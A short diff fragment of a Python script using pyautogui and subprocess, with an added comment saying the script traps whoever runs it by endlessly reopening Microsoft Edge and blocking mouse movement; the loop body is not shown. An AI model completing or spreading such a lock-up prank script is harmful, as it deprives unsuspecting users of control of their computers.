@@ -1,6 +1,8 @@
-﻿import pyautogui
+import pyautogui
 import subprocess
 import time
+
+# this script will make the user who runs the code infinitely continue the microsoft edge opening and not being able to move the mouse cursor
 
 def mouse_msedge():
  while True:
